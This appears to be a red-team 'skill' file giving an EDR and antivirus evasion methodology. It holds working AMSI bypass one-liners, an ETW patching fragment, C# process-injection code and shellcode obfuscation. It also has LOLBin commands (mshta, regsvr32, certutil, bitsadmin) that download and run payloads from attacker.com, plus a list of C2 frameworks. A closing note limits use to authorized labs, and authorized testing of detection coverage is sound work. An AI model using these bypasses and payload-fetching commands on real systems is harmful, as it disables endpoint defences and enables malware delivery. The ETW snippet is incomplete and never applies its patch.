---
name: edr-evasion
description: EDR/AV evasion methodology for authorized red team operations. Covers process injection, AMSI bypass, ETW patching, LOLBins, reflective loading, and obfuscation techniques for testing endpoint detection coverage.
version: 1.0.0
license: Apache-2.0
---

# EDR Evasion

## Attack Surface

Endpoint Detection and Response (EDR) products use: kernel callbacks, userland API hooks, ETW (Event Tracing for Windows), behavioral analytics, static signatures, and memory scanning. Each layer is independently bypassable.

## Methodology

### Phase 1 — EDR identification

```powershell
# Identify running EDR agents
Get-Process | Where-Object {
    $_.Name -match 'sentinel|crowdstrike|defender|carbon|cylance|sophos|symantec|mcafee|trend|bitdefender'
}

# Check loaded drivers (kernel-level EDR components)
Get-WmiObject Win32_SystemDriver | Where-Object {$_.Name -match 'csagent|sentinel|cb|windefend'}

# Check userland hooks (EDR hooks ntdll.dll exports)
# Use PE-sieve or moneta to detect hooked functions
```

### Phase 2 — AMSI bypass

```powershell
# Classic: patch AmsiScanBuffer return value (AmsiInitFailed)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# COM-based bypass
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').GetValue($null),0x80070057)

# Memory patch (requires SeDebugPrivilege)
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static')
$c=$b.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteByte($c, 0x258, 0)
```

### Phase 3 — ETW patching

```powershell
# Patch EtwEventWrite to prevent telemetry
$patch = [Byte[]] (0xc3)  # ret
$addr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Get-ProcAddress ntdll.dll EtwEventWrite), [Type[]] @([IntPtr])
)
```

### Phase 4 — Process injection techniques

**Classic CreateRemoteThread:**
```csharp
IntPtr procHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
IntPtr allocMem = VirtualAllocEx(procHandle, IntPtr.Zero, shellcodeSize,
    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(procHandle, allocMem, shellcode, shellcodeSize, out _);
CreateRemoteThread(procHandle, IntPtr.Zero, 0, allocMem, IntPtr.Zero, 0, out _);
```

**Early Bird (APC injection — evades CreateRemoteThread detection):**
```csharp
// Create suspended process, queue APC, resume
CreateProcess(..., CREATE_SUSPENDED, ...);
VirtualAllocEx → WriteProcessMemory → QueueUserAPC → ResumeThread
```

**Thread hijacking (no new thread created):**
```
SuspendThread → GetThreadContext → modify RIP to shellcode → SetThreadContext → ResumeThread
```

**Process hollowing:**
```
CreateProcess (suspended) → ZwUnmapViewOfSection → VirtualAllocEx → WriteProcessMemory → SetThreadContext (new EP) → ResumeThread
```

### Phase 5 — LOLBins (Living Off the Land)

```powershell
# Execute payload via signed Microsoft binaries
mshta.exe http://attacker.com/payload.hta
regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
certutil.exe -urlcache -split -f http://attacker.com/payload.exe payload.exe
bitsadmin.exe /transfer job /download /priority normal http://attacker.com/payload.exe %temp%\payload.exe
```

### Phase 6 — Shellcode obfuscation

```python
# XOR encode shellcode
key = 0x42
encoded = bytes([b ^ key for b in shellcode])

# Fragmentation — split across multiple variables
chunk1 = shellcode[:len(shellcode)//2]
chunk2 = shellcode[len(shellcode)//2:]
# Reconstruct in-memory before execution
```

## Tools

- [C2 Matrix](https://www.thec2matrix.com) — C2 framework comparison
- [Havoc](https://github.com/HavocFramework/Havoc) — modern C2
- [Sliver](https://github.com/BishopFox/sliver) — open-source C2
- [Cobalt Strike](https://www.cobaltstrike.com) — commercial C2 (requires license)
- [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) — find signature triggers
- [DefenderCheck](https://github.com/matterpreter/DefenderCheck) — Windows Defender bypass testing
- [BOF.NET](https://github.com/CCob/BOF.NET) — .NET BOF execution

## MITRE ATT&CK Mapping

- T1055 — Process Injection
- T1562.001 — Impair Defenses: Disable or Modify Tools
- T1218 — System Binary Proxy Execution (LOLBins)
- T1027 — Obfuscated Files or Information

## Notes

EDR evasion research must be conducted in isolated lab environments. Using these techniques against production endpoints without explicit authorization constitutes unauthorized computer access. Test against a dedicated EDR test tenant or VM.
